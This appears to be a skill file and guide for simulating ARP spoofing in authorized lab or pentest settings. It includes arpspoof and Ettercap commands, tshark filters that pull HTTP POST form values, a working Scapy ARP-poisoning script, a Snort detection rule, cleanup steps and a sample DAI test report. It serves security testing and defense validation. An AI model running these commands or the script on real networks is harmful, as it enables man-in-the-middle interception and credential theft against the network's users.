---
name: performing-arp-spoofing-attack-simulation
description: >
  Simulates ARP spoofing attacks in authorized lab or pentest environments using
  arpspoof, Ettercap, and Scapy to demonstrate man-in-the-middle risks, test network
  detection capabilities, and validate ARP inspection countermeasures.
domain: cybersecurity
subdomain: network-security
tags: [network-security, arp-spoofing, mitm, ettercap, layer2-attack]
version: "1.0"
author: mahipal
license: Apache-2.0
---
# Performing ARP Spoofing Attack Simulation

## When to Use

- Testing whether network switches and infrastructure properly implement Dynamic ARP Inspection (DAI)
- Demonstrating man-in-the-middle attack risks to stakeholders during authorized security assessments
- Validating that network monitoring tools (IDS/IPS, SIEM) detect ARP cache poisoning attempts
- Assessing the effectiveness of port security, 802.1X, and VLAN segmentation controls
- Training SOC analysts to recognize ARP spoofing indicators in network traffic

**Do not use** on production networks without explicit written authorization and a rollback plan, against networks carrying critical or life-safety traffic, or as a denial-of-service attack vector.

## Prerequisites

- Written authorization specifying in-scope network segments for ARP spoofing simulation
- Kali Linux or similar penetration testing distribution with arpspoof, Ettercap, and Scapy installed
- Direct Layer 2 access to the target network segment (same VLAN as target hosts)
- IP forwarding knowledge and ability to enable/disable packet forwarding on the attacker machine
- Wireshark or tcpdump for capturing traffic to verify interception
- Isolated lab environment or approved production test window

## Workflow

### Step 1: Enumerate the Target Network Segment

```bash
# Discover hosts on the local subnet
nmap -sn -PR 192.168.1.0/24 -oG arp_discovery.txt

# Identify the default gateway
ip route show default
# Output: default via 192.168.1.1 dev eth0

# Identify target hosts and their MAC addresses
arp-scan -l -I eth0

# Verify the current ARP table
arp -a

# Note the gateway IP (192.168.1.1) and target host IP (192.168.1.50)
# Record their legitimate MAC addresses for verification and cleanup
```

### Step 2: Enable IP Forwarding

```bash
# Enable IPv4 forwarding to relay packets between victim and gateway
sudo sysctl -w net.ipv4.ip_forward=1

# Verify forwarding is enabled
cat /proc/sys/net/ipv4/ip_forward
# Should output: 1

# Optionally prevent ICMP redirects that could alert the victim
sudo sysctl -w net.ipv4.conf.all.send_redirects=0
sudo sysctl -w net.ipv4.conf.eth0.send_redirects=0
```

### Step 3: Execute ARP Spoofing with arpspoof

```bash
# Spoof the gateway to the target (tell target we are the gateway)
sudo arpspoof -i eth0 -t 192.168.1.50 -r 192.168.1.1

# In a separate terminal, spoof the target to the gateway (bidirectional)
sudo arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.50

# Alternative: Use Ettercap for unified bidirectional spoofing
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```

### Step 4: Capture and Analyze Intercepted Traffic

```bash
# Capture all traffic flowing through the attacker machine
sudo tcpdump -i eth0 -w mitm_capture.pcap host 192.168.1.50

# Use tshark to capture HTTP credentials in real-time
sudo tshark -i eth0 -Y "http.request.method == POST" \
  -T fields -e ip.src -e http.host -e http.request.uri -e urlencoded-form.value

# Capture DNS queries from the victim
sudo tshark -i eth0 -Y "dns.qry.name and ip.src == 192.168.1.50" \
  -T fields -e frame.time -e dns.qry.name

# Use Ettercap with password collection filters
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// \
  -w ettercap_capture.pcap
```

### Step 5: Demonstrate Impact with Scapy (Custom ARP Packets)

```python
#!/usr/bin/env python3
"""ARP spoofing demonstration using Scapy for authorized security testing."""

from scapy.all import Ether, ARP, sendp, srp, conf
import time
import sys

conf.verb = 0

def get_mac(ip, iface="eth0"):
    """Resolve IP to MAC address via ARP request."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 timeout=2, iface=iface)
    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac, iface="eth0"):
    """Send spoofed ARP reply to target."""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(Ether(dst=target_mac) / packet, iface=iface, verbose=False)

def restore(target_ip, gateway_ip, target_mac, gateway_mac, iface="eth0"):
    """Restore legitimate ARP entries."""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                 psrc=gateway_ip, hwsrc=gateway_mac)
    sendp(Ether(dst=target_mac) / packet, iface=iface, count=5, verbose=False)

if __name__ == "__main__":
    target_ip = "192.168.1.50"
    gateway_ip = "192.168.1.1"
    iface = "eth0"

    target_mac = get_mac(target_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)

    if not target_mac or not gateway_mac:
        print("[!] Could not resolve MAC addresses. Exiting.")
        sys.exit(1)

    print(f"[*] Target: {target_ip} ({target_mac})")
    print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
    print("[*] Starting ARP spoofing... Press Ctrl+C to stop.")

    try:
        packets_sent = 0
        while True:
            spoof(target_ip, gateway_ip, target_mac, iface)
            spoof(gateway_ip, target_ip, gateway_mac, iface)
            packets_sent += 2
            print(f"\r[*] Packets sent: {packets_sent}", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables...")
        restore(target_ip, gateway_ip, target_mac, gateway_mac, iface)
        restore(gateway_ip, target_ip, gateway_mac, target_mac, iface)
        print("[*] ARP tables restored. Exiting.")
```

### Step 6: Verify Detection and Cleanup

```bash
# On the target machine, check for ARP cache poisoning indicators
arp -a | grep 192.168.1.1
# If spoofed, the gateway MAC will match the attacker's MAC

# Check IDS/SIEM for ARP spoofing alerts
# Snort rule that should trigger:
# alert arp any any -> any any (msg:"ARP Spoof Detected"; arp.opcode:2;
#   threshold:type both, track by_src, count 30, seconds 10; sid:1000010;)

# Stop the attack and restore ARP tables
# Ctrl+C on arpspoof/ettercap sessions

# Disable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=0

# Manually restore ARP entries on affected hosts (if needed)
# On target: arp -d 192.168.1.1 && ping -c 1 192.168.1.1
# On gateway: arp -d 192.168.1.50 && ping -c 1 192.168.1.50

# Verify legitimate MAC addresses are restored
arp -a
```

## Key Concepts

| Term | Definition |
|------|------------|
| **ARP Cache Poisoning** | Technique of sending fraudulent ARP replies to associate the attacker's MAC address with another host's IP address in the target's ARP cache |
| **Gratuitous ARP** | ARP reply sent without a corresponding request, used by ARP spoofing tools to update a target's ARP cache with false entries |
| **Dynamic ARP Inspection (DAI)** | Switch-level security feature that validates ARP packets against the DHCP snooping binding database and drops invalid ARP traffic |
| **IP Forwarding** | Kernel-level setting that allows a host to relay packets between network interfaces, required for transparent man-in-the-middle interception |
| **DHCP Snooping** | Switch security feature that builds a trusted binding table of IP-to-MAC-to-port mappings, serving as the foundation for DAI validation |

## Tools & Systems

- **arpspoof (dsniff suite)**: Simple command-line tool that sends continuous spoofed ARP replies to redirect traffic between two targets
- **Ettercap**: Comprehensive suite for man-in-the-middle attacks supporting ARP spoofing, DNS spoofing, content filtering, and credential capture
- **Scapy**: Python packet manipulation library for crafting custom ARP packets with full control over all header fields
- **arp-scan**: Network scanning tool that sends ARP requests to discover all hosts on a local network segment
- **Wireshark**: Packet analyzer for verifying ARP spoofing success and capturing intercepted traffic for analysis

## Common Scenarios

### Scenario: Testing Dynamic ARP Inspection Effectiveness on Enterprise Switches

**Context**: A network team deployed Cisco DAI on all access-layer switches and needs to validate that ARP spoofing attempts are properly detected and blocked. The test is authorized on a dedicated VLAN (VLAN 100) with three test hosts and one attacker machine connected to the same switch.

**Approach**:
1. Document baseline ARP tables on all hosts and the legitimate MAC-IP bindings in the DHCP snooping database
2. Run arpspoof from the attacker machine targeting the default gateway and a test workstation
3. Verify that the switch drops spoofed ARP packets by checking DAI statistics: `show ip arp inspection statistics vlan 100`
4. Confirm the test workstation's ARP cache still shows the legitimate gateway MAC address
5. Temporarily disable DAI on the test VLAN and repeat the attack to confirm it succeeds without the control
6. Re-enable DAI and document results showing the control is effective
7. Verify that IDS alerts were generated for both the blocked and unblocked attack attempts

**Pitfalls**:
- Running ARP spoofing on a VLAN without DAI and accidentally disrupting legitimate traffic
- Forgetting to enable IP forwarding, causing a denial-of-service instead of transparent interception
- Not restoring ARP tables after testing, leaving hosts with stale cache entries
- Testing on a trunk port instead of an access port, potentially affecting multiple VLANs

## Output Format

```
## ARP Spoofing Simulation Report

**Test ID**: NET-ARP-001
**Date**: 2024-03-15 14:00-15:00 UTC
**Target VLAN**: VLAN 100 (192.168.1.0/24)
**Attacker**: 192.168.1.99 (AA:BB:CC:DD:EE:FF)
**Target**: 192.168.1.50 (00:11:22:33:44:55)
**Gateway**: 192.168.1.1 (00:AA:BB:CC:DD:01)

### Test Results

| Test | DAI Status | ARP Spoof Result | Traffic Intercepted |
|------|------------|-------------------|---------------------|
| Test 1 | Enabled | Blocked (switch dropped 847 packets) | No |
| Test 2 | Disabled | Successful (target ARP cache poisoned) | Yes - 23 HTTP sessions |
| Test 3 | Re-enabled | Blocked | No |

### Detection Coverage
- DAI: PASS - Dropped all spoofed ARP replies when enabled
- IDS (Snort): PASS - Generated alert SID:1000010 within 15 seconds
- SIEM: PASS - Alert correlated and escalated within 2 minutes

### Recommendations
1. Maintain DAI enabled on all access VLANs (currently disabled on VLANs 200, 210)
2. Enable DHCP snooping rate limiting to prevent DHCP starvation attacks
3. Deploy 802.1X port authentication to complement ARP inspection
```
